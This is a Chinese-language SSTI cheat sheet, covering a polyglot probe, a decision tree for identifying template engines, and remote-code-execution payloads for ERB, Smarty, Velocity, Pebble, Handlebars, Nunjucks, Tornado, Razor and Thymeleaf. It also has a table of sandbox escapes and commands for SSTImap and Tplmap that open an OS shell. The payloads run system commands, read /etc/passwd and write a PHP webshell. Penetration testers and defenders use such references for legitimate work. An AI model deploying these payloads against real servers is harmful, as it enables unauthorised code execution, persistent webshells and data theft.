# 多引擎 RCE Payload 速查与沙箱逃逸

## 通用检测 Polyglot

一次性投递，根据响应差异判断引擎类型：

```text
${{<%[%'"}}%\
```

分步 polyglot 探测序列：

```text
{{7*7}}        → 49 则为 Jinja2/Twig/Tornado/Nunjucks 系
${7*7}         → 49 则为 FreeMarker/Velocity/Thymeleaf/Mako/EL 系
<%= 7*7 %>     → 49 则为 ERB/Slim/ASP/Mojolicious
#{7*7}         → 49 则为 Pug/Jade/FreeMarker(legacy)
@(2+2)         → 4  则为 Razor (.NET)
{7*7}          → 49 则为 Smarty
{{7*'7'}}      → 7777777 确认 Jinja2; → 49 确认 Twig
```

## 引擎识别决策树（完整版）

```text
输入 {{7*7}}
├─ 返回 49
│  ├─ {{7*'7'}} → 7777777 → Jinja2 (Python)
│  ├─ {{7*'7'}} → 49      → Twig (PHP)
│  └─ {{7*'7'}} → 报错    → Tornado / Nunjucks (看 Server 头)
├─ 返回 ${7*7}（原样）→ 非表达式语言
├─ 报错/空 → 可能有 WAF，换语法 ↓
│
输入 ${7*7}
├─ 返回 49
│  ├─ ${.version} 有值    → FreeMarker (Java)
│  ├─ ${T(java.lang.Math).random()} 有值 → Spring EL / Thymeleaf
│  └─ 其余 → Velocity / Mako / Java EL
│
输入 <%= 7*7 %>
├─ 返回 49 → ERB (Ruby) / ASP / Mojolicious
│
输入 #{7*7}
├─ 返回 49 → Pug/Jade (Node.js)
│
输入 @(2+2)
├─ 返回 4  → Razor (.NET)
│
输入 {7*7}
├─ 返回 49 → Smarty (PHP)
```

## 多引擎 RCE Payload 速查表

### ERB (Ruby)

```ruby
<%= system("id") %>
<%= `cat /etc/passwd` %>
<%= File.open('/etc/passwd').read %>
<%= IO.popen('id').readlines() %>
```

### Smarty (PHP)

```php
{system('id')}
{$smarty.version}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

注意：`{php}...{/php}` 在 Smarty v3 已废弃。

### Velocity (Java)

```java
#set($s="")
#set($rt=$s.getClass().forName("java.lang.Runtime").getRuntime())
#set($proc=$rt.exec("id"))
#set($out=$proc.getInputStream())
#set($sc=$s.getClass().forName("java.util.Scanner"))
$sc.getConstructor($out.getClass()).newInstance($out).useDelimiter("\A").next()
```

### Pebble (Java)

旧版本 (< 3.0.9)：

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

新版本 (>= 3.0.9)：

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

### Handlebars (Node.js)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks (Node.js)

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Tornado (Python)

```python
{% import os %}{{os.system('id')}}
```

### Razor (.NET)

```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@(1+2)
```

反射绕过黑名单（运行时加载 DLL）：

```text
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null,"/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null,"/bin/bash,-c whoami".Split(","))}
```

### Thymeleaf (Java / Spring)

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

表达式前缀替换：`${...}` 不行就试 `#{...}`、`*{...}`、`@{...}`、`~{...}`。

## 沙箱逃逸技巧（按引擎）

| 引擎 | 限制场景 | 逃逸方法 |
|------|---------|---------|
| FreeMarker | `?new()` 被禁 | 用 `?api` 内建函数调 `class.forName()` 反射执行 |
| FreeMarker | `<#assign>` 被过滤 | 改用 `${"...Execute"?new()("id")}` 内联 |
| FreeMarker | 版本 < 2.3.30 | classLoader 链加载 ObjectWrapper 绕沙箱 |
| Pebble | >= 3.0.9 禁直接 exec | 通过 `(1).TYPE.forName()` 反射链获取 Runtime |
| Twig | 2.x/3.x 沙箱 | `{['id']|filter('system')}` 或 `sort('system')` |
| Smarty v3 | `{php}` 废弃 | 用 `{system('cmd')}` 或写文件 webshell |
| Handlebars | 无直接代码执行 | 原型链：`string.sub.constructor` 构造 Function |
| Nunjucks | 无 eval | `range.constructor(...)()` 构造函数执行 |
| Thymeleaf | 默认不支持动态模板 | 利用预处理 `__${...}__` 或 Spring View path 注入 |
| Razor (.NET) | 类黑名单 | `System.Reflection.Assembly.LoadFile/Load` 运行时加载 |
| Velocity | SecurityManager | `String.forName("java.lang.Runtime")` 反射绕过 |

## 自动化工具

```bash
# TInjA — polyglot 自动探测引擎
tinja url -u "http://target/?name=test" -H "Cookie: sess=xxx"

# SSTImap — 多引擎自动化利用
python3 sstimap.py -u "http://target/?name=test" -s

# Tplmap — 老牌 SSTI 利用工具
python2.7 tplmap.py -u "http://target/?name=*" --os-shell
```
